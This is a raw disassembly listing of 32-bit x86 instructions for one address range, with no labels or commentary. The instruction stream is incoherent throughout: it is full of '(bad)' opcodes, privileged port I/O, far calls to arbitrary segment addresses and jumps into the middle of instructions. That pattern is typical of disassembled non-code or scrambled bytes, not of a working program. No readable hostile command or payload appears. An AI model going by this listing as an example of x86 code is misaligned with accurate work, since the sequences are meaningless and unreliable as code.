  40c5ca:	mov    esp,?
  40c5cc:	loopne 0x40c560
  40c5ce:	pop    eax
  40c5cf:	loop   0x40c5bb
  40c5d1:	pop    es
  40c5d2:	jb     0x40c5a2
  40c5d4:	xor    al,0xa
  40c5d6:	sar    DWORD PTR [ecx-0x51a3d396],0xdf
  40c5dd:	jmp    0x40c5b8
  40c5df:	test   BYTE PTR [esi-0x5e],bl
  40c5e2:	push   0x5eb53581
  40c5e7:	jb     0x40c582
  40c5e9:	inc    edx
  40c5ea:	adc    cl,dh
  40c5ec:	addr16 sti 
  40c5ee:	push   ss
  40c5ef:	fsubr  QWORD PTR [ebp-0x78]
  40c5f2:	jle    0x40c599
  40c5f4:	add    BYTE PTR [eax+0x39],0xe2
  40c5f8:	jp     0x40c675
  40c5fa:	xchg   ecx,eax
  40c5fb:	in     al,dx
  40c5fc:	inc    ebx
  40c5fd:	sub    al,0x20
  40c5ff:	mov    dl,0x14
  40c601:	cmp    edx,DWORD PTR [edi+0x42]
  40c604:	xor    edi,DWORD PTR [ebp+0x55]
  40c607:	add    DWORD PTR [ebx*8-0x647f660b],0x56f4c7ab
  40c612:	mov    BYTE PTR [edx-0x46],bh
  40c615:	repz pop edx
  40c617:	jno    0x40c662
  40c619:	add    cl,al
  40c61b:	ins    DWORD PTR es:[edi],dx
  40c61c:	push   ds
  40c61d:	jmp    FWORD PTR [eax+eax*1-0x38]
  40c621:	pusha  
  40c622:	push   cs
  40c623:	pop    es
  40c624:	ja     0x40c5b6
  40c626:	aad    0x7b
  40c628:	cdq    
  40c629:	sbb    dl,BYTE PTR [ecx]
  40c62b:	lods   al,BYTE PTR ds:[esi]
  40c62c:	les    ebx,FWORD PTR [ebx+0x79209610]
  40c632:	cld    
  40c633:	mov    ?,WORD PTR [edi+0x62592fe8]
  40c639:	test   al,0xf5
  40c63b:	push   eax
  40c63c:	cmc    
  40c63d:	mov    ds:0xffe4ae52,eax
  40c642:	mov    eax,ds:0xe6db33bd
  40c647:	aaa    
  40c648:	mov    ebx,DWORD PTR [ebx+esi*2+0x10]
  40c64c:	push   esp
  40c64d:	in     al,dx
  40c64e:	jmp    0x18eb8b7
  40c653:	and    al,0xea
  40c655:	in     al,dx
  40c656:	(bad)  
  40c657:	sub    esi,esp
  40c659:	push   ebp
  40c65a:	push   ebx
  40c65b:	add    esp,DWORD PTR [esi*8-0x5067977c]
  40c662:	mov    eax,edi
  40c664:	daa    
  40c665:	sub    BYTE PTR [edx],bh
  40c667:	(bad)  
  40c669:	(bad)  
  40c66a:	dec    esp
  40c66b:	mov    DWORD PTR [esi-0x75],esp
  40c66e:	xor    esp,eax
  40c670:	pop    esp
  40c671:	shl    DWORD PTR [eax+0x22],1
  40c674:	dec    esi
  40c675:	mov    ebx,DWORD PTR [edx]
  40c677:	nop
  40c678:	fsub   DWORD PTR [ebx]
  40c67a:	fwait
  40c67b:	cmp    al,BYTE PTR [ebp+0x7ea130c0]
  40c681:	or     dl,bh
  40c683:	rol    BYTE PTR [ebx-0x3],1
  40c686:	aas    
  40c687:	fidivr DWORD PTR [ecx]
  40c689:	(bad)  
  40c68a:	out    0xa0,eax
  40c68c:	sub    al,0x4d
  40c68e:	and    al,0x3
  40c690:	push   eax
  40c691:	cmc    
  40c692:	je     0x40c69c
  40c694:	mov    esp,0x59c6cc1
  40c699:	imul   ecx,DWORD PTR [ebx-0x4f],0xffffffba
  40c69d:	loopne 0x40c685
  40c69f:	push   ebx
  40c6a0:	cwde   
  40c6a1:	xor    ecx,DWORD PTR [ebx]
  40c6a3:	inc    edx
  40c6a4:	inc    esp
  40c6a5:	(bad)  
  40c6a6:	sbb    eax,0x6ec514ab
  40c6ab:	arpl   WORD PTR [ecx-0x21],bp
  40c6ae:	and    eax,0xf45e71d3
  40c6b3:	out    0xae,al
  40c6b5:	das    
  40c6b6:	and    eax,0x7d520221
  40c6bb:	lds    eax,FWORD PTR [eax+ecx*8+0x1f]
  40c6bf:	push   es
  40c6c0:	repnz (bad) 
  40c6c2:	int3   
  40c6c3:	xor    BYTE PTR [edx],al
  40c6c5:	mov    DWORD PTR [ebp+0x4f9c7f8d],esi
  40c6cb:	mov    cl,dl
  40c6cd:	mov    ebx,eax
  40c6cf:	xchg   esp,eax
  40c6d0:	int    0x74
  40c6d2:	xor    bl,dh
  40c6d4:	or     eax,0x20358d0e
  40c6d9:	xchg   esi,eax
  40c6da:	stc    
  40c6db:	into   
  40c6dc:	popf   
  40c6dd:	mov    dh,0x97
  40c6df:	push   0x1e
  40c6e1:	xchg   edx,eax
  40c6e2:	push   0xa2088b81
  40c6e7:	jecxz  0x40c6c1
  40c6e9:	aaa    
  40c6ea:	xchg   ebp,eax
  40c6eb:	mov    ebp,0x746043b3
  40c6f0:	jne    0x40c6e5
  40c6f2:	out    0x72,eax
  40c6f4:	jnp    0x40c689
  40c6f6:	push   0x20
  40c6f8:	xlat   BYTE PTR ds:[ebx]
  40c6f9:	int3   
  40c6fa:	pop    edx
  40c6fb:	xor    eax,esi
  40c6fd:	sbb    ecx,DWORD PTR [edi+ecx*1-0x29a11c56]
  40c704:	inc    edx
  40c705:	add    ecx,DWORD PTR [ebp-0x52]
  40c708:	mov    esi,0x70fcaf1f
  40c70d:	dec    esp
  40c70e:	pop    ebp
  40c70f:	cmp    eax,0x8bb7caef
  40c714:	push   ds
  40c715:	cmp    dl,dh
  40c717:	rcr    DWORD PTR [ebx+eiz*1-0x43],0xaa
  40c71c:	inc    esp
  40c71d:	mov    al,ds:0x30339a82
  40c722:	pusha  
  40c723:	push   eax
  40c724:	and    esp,edx
  40c726:	or     eax,DWORD PTR [ebp+0x50f3410a]
  40c72c:	cmp    edx,edi
  40c72e:	cld    
  40c72f:	ficomp WORD PTR [edx]
  40c731:	mov    edi,0x69910d73
  40c736:	sbb    ebx,ecx
  40c738:	aas    
  40c739:	mov    ebx,0x2bfe506a
  40c73e:	xor    bh,BYTE PTR [ecx-0x68782898]
  40c744:	jnp    0x40c70e
  40c746:	ret    0xc947
  40c749:	(bad)  
  40c74a:	icebp  
  40c74b:	xchg   ebx,eax
  40c74c:	jecxz  0x40c790
  40c74e:	inc    ebx
  40c74f:	test   al,0xac
  40c751:	ror    BYTE PTR [ecx+0x95d3b39],1
  40c757:	fidivr DWORD PTR [edx-0xab3df61]
  40c75d:	mov    ah,bh
  40c75f:	inc    eax
  40c760:	inc    ebp
  40c761:	aas    
  40c762:	hlt    
  40c763:	fwait
  40c764:	cmp    eax,0xc9a47311
  40c769:	xor    bl,ah
  40c76b:	addr16 mov al,ds:0x67f1
  40c76f:	shr    BYTE PTR [edx-0x593cad4d],cl
  40c775:	xor    BYTE PTR [ebx],bl
  40c777:	mov    eax,0x74e6c09a
  40c77c:	mov    dh,0x79
  40c77e:	lahf   
  40c77f:	dec    BYTE PTR [esp+edi*8+0x30]
  40c783:	push   ss
  40c784:	xor    BYTE PTR [ebp+0x25],ah
  40c787:	and    DWORD PTR [ecx+0x0],ebp
  40c78a:	in     eax,0xaf
  40c78c:	mov    eax,ds:0x5b73ecb4
  40c791:	iret   
  40c792:	call   0xa78a:0xe06a7c48
  40c799:	push   0xffffff8a
  40c79b:	shr    cl,1
  40c79d:	inc    esi
  40c79e:	mov    ecx,esp
  40c7a0:	mov    esi,0x443c1b57
  40c7a5:	sub    DWORD PTR [edi],esi
  40c7a7:	lea    ebx,[edx+eax*2+0x7a]
  40c7ab:	scas   eax,DWORD PTR es:[edi]
  40c7ac:	push   ecx
  40c7ad:	cmp    bh,0xf3
  40c7b0:	imul   ebx,DWORD PTR [ecx-0x25dc13d5],0xb2e781f5
  40c7ba:	mov    esi,0xf35e3fbc
  40c7bf:	dec    edi
  40c7c0:	fistp  WORD PTR [ebx]
  40c7c2:	pop    esi
  40c7c3:	mov    esi,0xf85c4b
  40c7c8:	scas   eax,DWORD PTR es:[edi]
  40c7c9:	mov    eax,0xdcd177f1
  40c7ce:	jnp    0x40c7c0
  40c7d0:	jle    0x40c7a1
  40c7d2:	repnz inc ebx
  40c7d4:	ins    BYTE PTR es:[edi],dx
  40c7d5:	add    al,0xcf
  40c7d7:	mov    ebp,0xafb21aab
  40c7dc:	ret    
  40c7dd:	push   edi
  40c7de:	mov    ds:0x2c34500d,al
  40c7e3:	ret    0x57ec
  40c7e6:	add    BYTE PTR [ebx-0x4987a448],dl
  40c7ec:	sbb    eax,0xd5b113bc
  40c7f1:	inc    ecx
  40c7f2:	dec    esp
  40c7f3:	enter  0x796a,0x54
  40c7f7:	icebp  
  40c7f8:	pop    ecx
  40c7f9:	outs   dx,DWORD PTR ds:[esi]
  40c7fa:	push   ds
  40c7fb:	loopne 0x40c848
  40c7fd:	retf   
  40c7fe:	mov    ch,0x44
  40c800:	inc    ebp
  40c801:	jp     0x40c854
  40c803:	repnz pop ss
  40c805:	push   ss
  40c806:	mov    al,ds:0x22c58a4c
  40c80b:	(bad)  
  40c80c:	cmp    ch,BYTE PTR [esi]
  40c80e:	retf   
  40c80f:	enter  0x6070,0x48
  40c813:	in     al,dx
  40c814:	xchg   edi,eax
  40c815:	xchg   esi,eax
  40c816:	and    al,0xea
  40c818:	jb     0x40c877
  40c81a:	sbb    esp,DWORD PTR [ebp+0x30ecdb1a]
  40c820:	pop    es
  40c821:	mov    al,ds:0x6f51e606
  40c826:	js     0x40c881
  40c828:	mov    WORD PTR [esi+0x3b9b7fcb],gs
  40c82e:	and    DWORD PTR [esi+0x53b8b0ec],edx
  40c834:	mov    eax,ecx
  40c836:	jb     0x40c7c7
  40c838:	and    WORD PTR [edx],0x4b
  40c83c:	jno    0x40c82f
  40c83e:	jae    0x40c889
  40c840:	push   ebp
  40c841:	retf   
  40c842:	in     eax,dx
  40c843:	xchg   edx,eax
  40c844:	push   0x43
  40c846:	ds and eax,0x308dd92c
  40c84c:	jns    0x40c88e
  40c84e:	jns    0x40c8ae
  40c850:	xchg   ebx,eax
  40c851:	adc    ch,BYTE PTR [eax+0x68]
  40c854:	test   DWORD PTR [edx+ecx*2],esp
  40c857:	adc    BYTE PTR [edi+ebp*2-0x65],0x22
  40c85c:	push   esi
  40c85d:	and    dl,BYTE PTR [ebx-0x1b]
  40c860:	jl     0x40c868
  40c862:	mov    ebp,0x5bbe6fbe
  40c867:	adc    al,0xf9
  40c869:	jmp    0x40c8c9
  40c86b:	fwait
  40c86c:	sub    DWORD PTR [ebx-0x1235b610],ebx
  40c872:	test   DWORD PTR [esi-0x1c],ebx
  40c875:	leave  
  40c876:	adc    ah,BYTE PTR [eax]
  40c878:	inc    eax
  40c879:	scas   eax,DWORD PTR es:[edi]
  40c87a:	mov    al,dl
  40c87c:	mov    ecx,0x49590ed9
  40c881:	ds repnz cmc 
  40c884:	or     ebx,DWORD PTR ds:0xe1164c20
  40c88a:	inc    esi
  40c88b:	dec    edi
  40c88c:	xor    al,ah
  40c88e:	dec    esp
  40c88f:	fs nop
  40c891:	mov    DWORD PTR [eax-0x73],0x2f7e186
  40c898:	or     al,0x98
  40c89a:	mov    bh,0xbb
  40c89c:	loop   0x40c832
  40c89e:	pop    esi
  40c89f:	call   0xd272:0xa818f09f
  40c8a6:	push   eax
  40c8a7:	std    
  40c8a8:	mov    dl,0x21
  40c8aa:	xor    ebp,DWORD PTR [ecx-0x206c797e]
  40c8b0:	inc    ebx
  40c8b1:	pusha  
  40c8b2:	jae    0x40c8d7
  40c8b4:	imul   edx,DWORD PTR [edi+0x636d7512],0x70
  40c8bb:	or     esp,DWORD PTR [ebx+0x5b421348]
  40c8c1:	outs   dx,DWORD PTR ds:[esi]
  40c8c2:	hlt    
  40c8c3:	xchg   ebp,eax
  40c8c4:	popf   
  40c8c5:	add    al,0xe2
  40c8c7:	mov    DWORD PTR [edx],0x7a324cca
  40c8cd:	in     eax,dx
  40c8ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8cf:	(bad)  
  40c8d0:	sar    BYTE PTR [ebx+edi*4-0x22],1
  40c8d4:	push   cs
  40c8d5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40c8d7:	jo     0x40c8ff
  40c8d9:	call   0x3c4dcb79
  40c8de:	popa   
  40c8df:	mov    bl,0xdd
  40c8e1:	aaa    
  40c8e2:	adc    DWORD PTR [ebp+0x18],0xffffffd3
  40c8e6:	xor    BYTE PTR ds:0x1b9a95e8,0x54
  40c8ed:	mov    al,0xff
  40c8ef:	sbb    ch,bl
  40c8f1:	and    eax,0xb7b8c05a
  40c8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f7:	jle    0x40c8e1
  40c8f9:	and    BYTE PTR ss:[esi+0x36],ch
  40c8fd:	daa    
  40c8fe:	dec    edx
  40c8ff:	add    BYTE PTR [edi+edi*2],ah
  40c902:	int3   
  40c903:	and    al,0x22
  40c905:	pop    esi
  40c906:	xor    al,dl
  40c908:	pop    ss
  40c909:	lahf   
  40c90a:	das    
  40c90b:	pop    edx
  40c90c:	jle    0x40c90f
  40c90e:	(bad)  
  40c90f:	loopne 0x40c8c1
  40c911:	pop    eax
  40c912:	in     ax,0x83
  40c915:	leave  
  40c916:	or     BYTE PTR [ebp-0x41e7dc9b],bh
  40c91c:	jmp    0x40c8f1
  40c91e:	pop    es
  40c91f:	inc    ebp
  40c920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c921:	mov    eax,0xa9ef9656
  40c926:	pop    ebp
  40c927:	or     esp,DWORD PTR [ebx+eiz*2+0x1e581e5d]
  40c92e:	pushf  
  40c92f:	imul   ecx,ebp,0x38
  40c932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c933:	das    
  40c934:	jmp    0x87ea8c79
  40c939:	ficom  DWORD PTR [edx]
  40c93b:	daa    
  40c93c:	ins    DWORD PTR es:[edi],dx
  40c93d:	dec    edi
  40c93e:	xlat   BYTE PTR ds:[ebx]
  40c93f:	not    ebx
  40c941:	push   ecx
  40c942:	out    0xac,eax
  40c944:	pushf  
  40c945:	and    BYTE PTR [eax-0x4892c616],bl
  40c94b:	or     eax,0x8a77d2b3
  40c950:	pop    edx
  40c951:	dec    ecx
  40c952:	jnp    0x40c9d2
  40c954:	jno    0x40c8fb
  40c956:	mov    dh,0x94
  40c958:	xchg   esp,eax
  40c959:	repnz (bad) [ebx+0x477dc72d]
  40c960:	mov    edx,0xe024fc6a
  40c965:	cmc    
  40c966:	xor    BYTE PTR [edx+0x26],0xf6
  40c96a:	sub    DWORD PTR [ebp-0x4f],esp
  40c96d:	jae    0x40c9b5
  40c96f:	icebp  
  40c970:	cmc    
  40c971:	add    esi,ecx
  40c973:	adc    eax,0xf718a75b
  40c978:	fsubr  DWORD PTR [esi-0x238a3330]
  40c97e:	cmp    al,BYTE PTR ds:0x54df892d
  40c984:	mov    esi,esp
  40c986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c987:	fs mov ebx,0x749d02e5
  40c98d:	shl    DWORD PTR [edi],1
  40c98f:	inc    edx
  40c990:	jae    0x40c9bb
  40c992:	mov    ch,0xa9
  40c994:	jne    0x40c987
  40c996:	test   DWORD PTR [ecx],edx
  40c998:	retf   0x97ac
  40c99b:	sbb    dl,BYTE PTR [eax]
  40c99d:	mov    cl,0x69
  40c99f:	arpl   WORD PTR [esi-0x28],di
  40c9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a3:	out    dx,al
  40c9a4:	or     BYTE PTR [ebp-0x38b68480],bh
  40c9aa:	mov    ah,0x6c
  40c9ac:	jne    0x40c93e
  40c9ae:	hlt    
  40c9af:	xchg   esp,eax
  40c9b0:	js     0x40c943
  40c9b2:	call   0xeb1d:0xc10ca95d
  40c9b9:	adc    al,0x8a
  40c9bb:	aaa    
  40c9bc:	call   0xfc8c3834
  40c9c1:	js     0x40c9bb
  40c9c3:	sbb    al,0xb1
  40c9c5:	pop    ecx
  40c9c6:	and    al,0x3d
  40c9c8:	cld    
  40c9c9:	iret   
  40c9ca:	jb     0x40c9d8
  40c9cc:	je     0x40ca4a
  40c9ce:	xchg   ebp,eax
  40c9cf:	retf   0x1784
  40c9d2:	xchg   edi,eax
  40c9d3:	retf   0xa9ba
  40c9d6:	jae    0x40c99c
  40c9d8:	sbb    al,0xc3
  40c9da:	mov    dh,0xcf
  40c9dc:	sub    eax,0x7c44203
  40c9e1:	push   eax
  40c9e2:	(bad)  
  40c9e3:	jne    0x40ca13
  40c9e5:	or     al,0x4f
  40c9e7:	not    esp
  40c9e9:	mov    ebx,0x88f7d185
  40c9ee:	cdq    
  40c9ef:	jg     0x40ca5f
  40c9f1:	add    ah,BYTE PTR [ecx+0x51]
  40c9f4:	inc    edx
  40c9f5:	pushf  
  40c9f6:	and    al,cl
  40c9f8:	inc    ebp
  40c9f9:	test   edx,0x341ac0
  40c9ff:	lods   eax,DWORD PTR ds:[esi]
  40ca00:	aam    0x2f
  40ca02:	(bad)  
  40ca03:	or     eax,0x7c02e121
  40ca08:	fs ss pop eax
  40ca0b:	ret    0x627b
  40ca0e:	test   eax,0xa9cdced4
  40ca13:	rcr    ebx,1
  40ca15:	loope  0x40c9e0
  40ca17:	jo     0x40ca5e
  40ca19:	pusha  
  40ca1a:	add    DWORD PTR [esi+0x26c9745b],ebx
  40ca20:	jp     0x40ca8c
  40ca22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca23:	(bad)  
  40ca24:	nop
  40ca25:	stc    
  40ca26:	or     al,0x42
  40ca28:	jl     0x40ca91
  40ca2a:	add    edi,DWORD PTR [esp+edx*8]
  40ca2d:	les    esp,FWORD PTR [edx+eax*1-0x4714e2d7]
  40ca34:	cwde   
  40ca35:	mov    edx,0xc6a67367
  40ca3a:	push   ds
  40ca3b:	nop
  40ca3c:	mov    ch,0x32
  40ca3e:	or     eax,ebp
  40ca40:	push   ecx
  40ca41:	jmp    0xd80fcb55
  40ca46:	repnz add eax,esp
  40ca49:	stos   BYTE PTR es:[edi],al
  40ca4a:	adc    DWORD PTR [ebx+0x182d6e7c],eax
  40ca50:	lods   al,BYTE PTR ds:[esi]
  40ca51:	shr    DWORD PTR es:[edi-0x21015acc],1
  40ca58:	out    dx,al
  40ca59:	fisubr WORD PTR [ebx+0x5e]
  40ca5c:	mov    ecx,0xc08641a9
  40ca61:	fadd   DWORD PTR [ecx]
  40ca63:	jnp    0x40ca41
  40ca65:	pop    eax
  40ca66:	nop
  40ca67:	push   ebx
  40ca68:	cmp    eax,0x721bf888
  40ca6d:	dec    esp
  40ca6e:	push   cs
  40ca6f:	sbb    edx,edx
  40ca71:	int    0xa6
  40ca73:	lock adc ch,BYTE PTR [ebp-0x2]
  40ca77:	dec    esp
  40ca78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca79:	xchg   ebx,eax
  40ca7a:	sub    DWORD PTR [ebp+0x2e5a20d7],ebp
  40ca80:	xchg   edi,eax
  40ca81:	sub    al,0x48
  40ca83:	cli    
  40ca84:	rcl    DWORD PTR [ecx-0x65],0xfa
  40ca88:	into   
  40ca89:	fist   DWORD PTR [esp+eax*1-0x32]
  40ca8d:	push   esi
  40ca8e:	cld    
  40ca8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca90:	add    ch,BYTE PTR [ecx+0x19]
  40ca93:	sbb    dl,BYTE PTR [ecx]
  40ca95:	(bad)  
  40ca97:	call   0x26797382
  40ca9c:	jno    0x40ca78
  40ca9e:	fs out 0x13,eax
  40caa1:	or     edi,DWORD PTR [edi]
  40caa3:	sbb    bh,dh
  40caa5:	cld    
  40caa6:	gs fmul st(2),st
  40caa9:	lea    edi,[ebx]
  40caab:	push   ecx
  40caac:	add    BYTE PTR [eax-0x77c6d340],al
  40cab2:	ins    BYTE PTR es:[edi],dx
  40cab3:	ins    DWORD PTR es:[edi],dx
  40cab4:	xor    eax,0x17864d00
  40cab9:	sti    
  40caba:	std    
  40cabb:	popf   
  40cabc:	or     al,0xb9
  40cabe:	(bad)  
  40cabf:	ror    DWORD PTR [ebx],1
  40cac1:	inc    eax
  40cac2:	sbb    BYTE PTR [ebx-0x32],0x59
  40cac6:	in     eax,dx
  40cac7:	ins    BYTE PTR es:[edi],dx
  40cac8:	dec    edx
  40cac9:	in     al,0x53
  40cacb:	lods   eax,DWORD PTR ds:[esi]
  40cacc:	xchg   BYTE PTR [ecx],bh
  40cace:	stos   DWORD PTR es:[edi],eax
  40cacf:	jp     0x40cafe
  40cad1:	int    0x8c
  40cad3:	ss lahf 
  40cad5:	add    bl,BYTE PTR [ebp+0x7b9b2d4]
  40cadb:	out    dx,al
  40cadc:	test   esp,ecx
  40cade:	ror    DWORD PTR ds:0x7ece4e5c,1
  40cae4:	fst    QWORD PTR [ebx]
  40cae6:	aaa    
  40cae7:	fbstp  TBYTE PTR [eax-0x13]
  40caea:	or     edi,esi
  40caec:	add    BYTE PTR [eax],cl
  40caee:	jno    0x27afdd8c
  40caf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caf5:	shl    BYTE PTR [edi-0x200f307f],1
  40cafb:	mov    esp,0xb6e561d
  40cb00:	push   ecx
  40cb01:	xchg   edx,esp
  40cb03:	inc    edx
  40cb04:	cmp    esi,eax
  40cb06:	and    BYTE PTR [edx-0x213ce557],dh
  40cb0c:	test   DWORD PTR [ebp-0x35],esp
  40cb0f:	clc    
  40cb10:	fsubr  DWORD PTR [ecx]
  40cb12:	add    al,0xd8
  40cb14:	cwde   
  40cb15:	cdq    
  40cb16:	popf   
  40cb17:	or     esp,DWORD PTR [ecx]
  40cb19:	or     al,ah
  40cb1b:	mov    ecx,0x1edaaf45
  40cb20:	adc    eax,0xd4b6787d
  40cb25:	jg     0x40cb61
  40cb27:	enter  0x2193,0xbb
  40cb2b:	shr    DWORD PTR ds:0x4f6c72fc,cl
  40cb31:	pop    es
  40cb32:	sbb    dh,cl
  40cb34:	lds    esp,FWORD PTR [esi]
  40cb36:	std    
  40cb37:	outs   dx,BYTE PTR ds:[esi]
  40cb38:	mov    al,ds:0x2c6307fe
  40cb3d:	jns    0x40cb23
  40cb3f:	fwait
  40cb40:	push   ebp
  40cb41:	jecxz  0x40cb23
  40cb43:	jno    0x40cb23
  40cb45:	les    ebx,FWORD PTR [esi-0x79]
  40cb48:	loop   0x40cb20
  40cb4a:	pop    esi
  40cb4b:	xchg   esp,eax
  40cb4c:	ret    
  40cb4d:	push   ebx
  40cb4e:	fdiv   QWORD PTR [esi+edi*1-0x2a8dc41b]
  40cb55:	xor    ebx,ecx
  40cb57:	in     eax,0x10
  40cb59:	and    BYTE PTR [edi-0x597ce728],al
  40cb5f:	adc    BYTE PTR [eax],bh
  40cb61:	xor    ebx,ecx
  40cb63:	(bad)  [ecx]
  40cb65:	jb     0x40cbe2
  40cb67:	pop    ecx
  40cb68:	lds    ecx,FWORD PTR [edi-0x7a]
  40cb6b:	(bad)  
  40cb6c:	or     esi,DWORD PTR [esi]
  40cb6e:	or     BYTE PTR [esi-0x51],dl
  40cb71:	dec    ecx
  40cb72:	xor    eax,0x41519cc6
  40cb77:	sbb    DWORD PTR [ecx],ecx
  40cb79:	or     bh,bh
  40cb7b:	mov    al,0xa2
  40cb7d:	xlat   BYTE PTR ds:[ebx]
  40cb7e:	jecxz  0x40cb0e
  40cb80:	leave  
  40cb81:	sbb    ch,BYTE PTR [esi-0xa]
  40cb84:	iret   
  40cb85:	aaa    
  40cb86:	sub    DWORD PTR [ecx],ecx
  40cb88:	clc    
  40cb89:	or     ebx,edi
  40cb8b:	jg     0x40cb42
  40cb8d:	iret   
  40cb8e:	mov    esp,eax
  40cb90:	and    DWORD PTR [esi],esp
  40cb92:	mul    DWORD PTR [eax-0x59cdb095]
  40cb98:	xor    esp,DWORD PTR [edi-0x44]
  40cb9b:	jmp    0x1b87391c
  40cba0:	push   es
  40cba1:	or     BYTE PTR [esi-0x57],dh
  40cba4:	daa    
  40cba5:	and    esi,DWORD PTR [ecx+0x3a]
  40cba8:	or     ah,BYTE PTR [eax-0x1b]
  40cbab:	mov    cl,0xcd
  40cbad:	pop    edx
  40cbae:	dec    ebx
  40cbaf:	inc    eax
  40cbb0:	pop    ebp
  40cbb1:	hlt    
  40cbb2:	leave  
  40cbb3:	push   es
  40cbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb5:	mov    esp,0xbee5d4d9
  40cbba:	and    al,0x5e
  40cbbc:	fisub  WORD PTR [edi-0x3d]
  40cbbf:	icebp  
  40cbc0:	fisubr WORD PTR [edi]
  40cbc2:	dec    ebx
  40cbc3:	jno    0x40cbcc
  40cbc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbc6:	cmp    dh,ah
  40cbc8:	xor    bh,cl
  40cbca:	call   0x1316:0xb86c9716
  40cbd1:	jns    0x40cb82
  40cbd3:	jl     0x40cc12
  40cbd5:	push   edx
  40cbd6:	sbb    BYTE PTR [esp+eiz*2-0x792558f6],0x8a
  40cbde:	icebp  
  40cbdf:	pop    DWORD PTR [ebx-0xd]
  40cbe2:	add    esi,DWORD PTR [ecx+0x1cd57773]
  40cbe8:	or     bh,al
  40cbea:	dec    DWORD PTR [edx+0x7da5e7b3]
  40cbf0:	ds push cs
  40cbf2:	cmp    ebx,DWORD PTR [edi+0x64099fcd]
  40cbf8:	pop    eax
  40cbf9:	pop    edx
  40cbfa:	mov    eax,0x5d0cf1f3
  40cbff:	push   ss
  40cc00:	daa    
  40cc01:	dec    ecx
  40cc02:	pop    ds
  40cc03:	xchg   BYTE PTR [edi],cl
  40cc05:	shr    BYTE PTR [edi],1
  40cc07:	(bad)  
  40cc08:	lock aad 0xf2
  40cc0b:	jmp    0x40cbdf
  40cc0d:	and    edx,DWORD PTR [eax-0x5f638148]
  40cc13:	push   eax
  40cc14:	jne    0x40cbf5
  40cc16:	and    eax,0xd9527ddb
  40cc1b:	rcr    DWORD PTR [edi],cl
  40cc1d:	dec    esi
  40cc1e:	pop    ecx
  40cc1f:	sbb    BYTE PTR [eax],dl
  40cc21:	cld    
  40cc22:	jmp    0x40cc73
  40cc24:	addr16 jg 0x40cc5d
  40cc27:	xor    DWORD PTR [edx],ebp
  40cc29:	and    eax,0x13ba6691
  40cc2e:	out    dx,al
  40cc2f:	xlat   BYTE PTR ds:[ebx]
  40cc30:	pop    ebp
  40cc31:	stos   BYTE PTR es:[edi],al
  40cc32:	(bad)  
  40cc33:	cli    
  40cc34:	int3   
  40cc35:	or     eax,0x7bf1baa
  40cc3a:	(bad)  
  40cc3b:	xor    BYTE PTR [edx-0x7026305a],bh
  40cc41:	loopne 0x40cc5d
  40cc43:	adc    eax,0x27d4385f
  40cc48:	not    edi
  40cc4a:	int3   
  40cc4b:	arpl   WORD PTR [ebx-0x75],cx
  40cc4e:	rcl    BYTE PTR [eax+0x3c],cl
  40cc51:	or     DWORD PTR [ebp+ebp*4+0x560028c2],ebp
  40cc58:	jno    0x40cc44
  40cc5a:	out    dx,al
  40cc5b:	push   es
  40cc5c:	jle    0x40cbf2
  40cc5e:	out    0x22,eax
  40cc60:	cmp    al,0x22
  40cc62:	iret   
  40cc63:	icebp  
  40cc64:	das    
  40cc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc66:	cs sbb al,0x6a
  40cc69:	add    BYTE PTR [esi],bh
  40cc6b:	mov    BYTE PTR [edx+eiz*2+0x62],0x3f
  40cc70:	adc    esi,DWORD PTR [esi+ebx*1-0x29]
  40cc74:	jno    0x40cc22
  40cc76:	stos   BYTE PTR es:[edi],al
  40cc77:	adc    al,0xcb
  40cc79:	mov    esp,0xbe24c945
  40cc7e:	lods   al,BYTE PTR ds:[esi]
  40cc7f:	test   eax,0x77e50633
  40cc84:	ficom  DWORD PTR [ebx-0x1b994ffe]
  40cc8a:	repnz loope 0x40ccea
  40cc8d:	loopne 0x40cc51
  40cc8f:	jp     0x40cc83
  40cc91:	inc    ecx
  40cc92:	pop    edi
  40cc93:	cmp    ebp,edi
  40cc95:	repnz out dx,al
  40cc97:	dec    eax
  40cc98:	mov    BYTE PTR ds:0xf44e972f,bh
  40cc9e:	jg     0x40ccb7
  40cca0:	xchg   edi,eax
  40cca1:	cs fisubr WORD PTR ss:[ecx]
  40cca5:	mov    dl,0xaa
  40cca7:	xchg   ebp,eax
  40cca8:	ror    DWORD PTR [esi],1
  40ccaa:	cmp    bh,BYTE PTR [eax+eiz*8]
  40ccad:	ror    BYTE PTR [ecx-0x6b06408b],1
  40ccb3:	mov    al,0xbc
  40ccb5:	cmp    eax,0x8e7ec489
  40ccba:	pop    eax
  40ccbb:	fwait
  40ccbc:	bound  edx,QWORD PTR [edi-0x52]
  40ccbf:	clc    
  40ccc0:	xor    BYTE PTR [edi-0x41ec85fc],dl
  40ccc6:	js     0x40cd3f
  40ccc8:	jle    0x40ccb5
  40ccca:	mov    ds:0x52c18498,eax
  40cccf:	call   0xa973fd02
  40ccd4:	pop    ss
  40ccd5:	dec    edi
  40ccd6:	mov    DWORD PTR [eax],ecx
  40ccd8:	jle    0x40ccc4
  40ccda:	loopne 0x40cd0a
  40ccdc:	dec    ebp
  40ccdd:	cmp    DWORD PTR [esi-0x3c],0x70
  40cce1:	sub    ebx,DWORD PTR [edi-0x59]
  40cce4:	pop    esp
  40cce5:	and    al,0x31
  40cce7:	mov    ch,0x41
  40cce9:	fs dec esp
  40cceb:	xor    al,0x49
  40cced:	rcr    BYTE PTR [esi],0x18
  40ccf0:	sub    bl,bh
  40ccf2:	lea    esi,[edi+0x19a8711d]
  40ccf8:	adc    edx,DWORD PTR [edx+0x26]
  40ccfb:	mov    ecx,0xfc0fcb62
  40cd00:	es loope 0x40cc87
  40cd03:	pop    es
  40cd04:	mov    ah,dl
